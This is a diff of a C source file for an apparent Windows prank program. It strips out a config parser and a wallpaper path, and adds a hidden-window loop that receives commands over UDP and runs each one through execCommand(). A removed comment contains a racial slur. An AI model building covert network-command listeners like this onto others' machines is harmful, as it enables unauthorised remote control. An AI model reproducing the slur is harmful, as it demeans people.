@@ -4,53 +4,13 @@
 */
 
 
-#include "Funnies.h"
-// pragma my nigga
-#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+#include "Main.h"
+#include "src/Funnies.h"
+#include "src/Socket.h"
 
-typedef struct
-{
-    char *keyPtr, *valuePtr;
-    int keyLen, valueLen;
-} KV;
+struct TeltharSocket tsocket;
 
-KV *scanner(char *str)
-{
-    int space = strchr(str, ' ') - str; // I hope this works
-
-    KV *tmp = calloc(1, sizeof(KV));
-
-    tmp->keyPtr = str;
-    tmp->keyLen = space;
-    tmp->valuePtr = str + space + 1;
-    tmp->valueLen = strlen(str) - space - 1;
-
-    return tmp;
-}
-
-//read line from file
-KV *readLF(FILE *fp) {
-    char c;
-    char buf[256];
-    int p = 0;
-
-    while (c = fgetc(fp) && !feof(fp))
-    {
-        if (c == '\n') {
-            return scanner(buf);
-        }
-        buf[p++] = c;
-    }
-}
-
-char *convert(char *str, int len)
-{
-    char *t = calloc(len, 1);
-    memcpy(t, str, len);
-    t[len] = '\0';
-    return t;
-}
-
+extern const char *PCName;
 
 int main(int argc, char *argv[])
 {
@@ -58,24 +18,20 @@ int main(int argc, char *argv[])
     ShowWindow(window, SW_MINIMIZE);
     ShowWindow(window, SW_HIDE);
 
-    //KV *r = scanner("volume 50");
-    //printf("[%s:%d] = [%s:%d]\n", r->keyPtr, r->keyLen, r->valuePtr, r->valueLen);
+    PCName = argv[1];
 
-
-    FILE *fp = fopen("config.cfg", "r");
-    
-    while (!feof(fp)) {
-        KV *configLine = readLF(fp);
-        
-        char *value = convert(configLine->keyPtr, configLine->keyLen);
-
-        if (!strcmp(value, "volume"))
-        {
-            waveOutGetVolume(NULL, (DWORD) atoi(value));
-        }
+    if (UDPBegin(&tsocket) != 0) {
+        sendError("Couldn't initialize socket server.");
+        return -1;
     }
-    
-    changeWallpaper(L"C:\\Users\\Krzysiek\\Desktop\\Wallpapers 2\\HLwallpaper01_16x9.jpg");
-    
+
+    while (1) {
+        JBCMD recv;
+        if (UDPRecv(&tsocket, &recv, sizeof(JBCMD)) == -1) {
+            sendError("Socket error.\n");
+            return -1;
+        }
+        execCommand(recv);
+    }
     return 0;
 }
